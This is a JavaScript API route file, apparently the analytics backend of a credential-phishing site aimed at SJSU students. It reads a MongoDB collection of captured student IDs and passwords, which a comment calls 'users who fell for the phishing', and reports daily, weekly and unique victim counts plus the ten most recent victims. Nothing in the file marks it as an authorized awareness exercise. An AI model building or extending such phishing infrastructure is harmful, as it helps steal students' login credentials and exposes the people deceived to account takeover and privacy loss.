import mongoose from "mongoose";

let isConnected = false;

// Connect to MongoDB
async function connectDB() {
  if (isConnected) return;
  await mongoose.connect("MONGODB_URI");
  isConnected = true;
  console.log("MongoDB connected for analytics");
}

// User schema (should match your existing schema)
const userSchema = new mongoose.Schema({
  sjsuId: String,
  password: String,
  createdAt: { type: Date, default: Date.now }
});

const User = mongoose.models.User || mongoose.model("User", userSchema);

export default async function handler(req, res) {
  await connectDB();

  if (req.method === "GET") {
    try {
      // Get all users who fell for the phishing
      const allUsers = await User.find().sort({ createdAt: -1 });
      const totalUsers = allUsers.length;

      // Get users from today
      const today = new Date();
      today.setHours(0, 0, 0, 0);
      const todayUsers = allUsers.filter(user => new Date(user.createdAt) >= today);
      const todayCount = todayUsers.length;

      // Get users from this week
      const weekAgo = new Date();
      weekAgo.setDate(weekAgo.getDate() - 7);
      const weekUsers = allUsers.filter(user => new Date(user.createdAt) >= weekAgo);
      const weekCount = weekUsers.length;

      // Get unique users (by sjsuId)
      const uniqueSjsuIds = [...new Set(allUsers.map(u => u.sjsuId))];
      const uniqueCount = uniqueSjsuIds.length;

      // Get data for the chart (last 7 days)
      const last7Days = [];
      for (let i = 6; i >= 0; i--) {
        const date = new Date();
        date.setDate(date.getDate() - i);
        date.setHours(0, 0, 0, 0);
        
        const nextDay = new Date(date);
        nextDay.setDate(nextDay.getDate() + 1);
        
        const count = allUsers.filter(user => {
          const userDate = new Date(user.createdAt);
          return userDate >= date && userDate < nextDay;
        }).length;
        
        last7Days.push({
          date: date.toLocaleDateString('en-US', { month: 'short', day: 'numeric' }),
          count: count
        });
      }

      return res.status(200).json({
        success: true,
        stats: {
          total: totalUsers,
          today: todayCount,
          thisWeek: weekCount,
          unique: uniqueCount
        },
        chartData: last7Days,
        recentUsers: allUsers.slice(0, 10).map(user => ({
          sjsuId: user.sjsuId,
          createdAt: user.createdAt
        }))
      });

    } catch (error) {
      console.error("Error fetching analytics:", error);
      return res.status(500).json({ 
        success: false, 
        message: "Server error",
        error: error.message 
      });
    }
  }

  return res.status(405).json({ success: false, message: "Method not allowed" });
}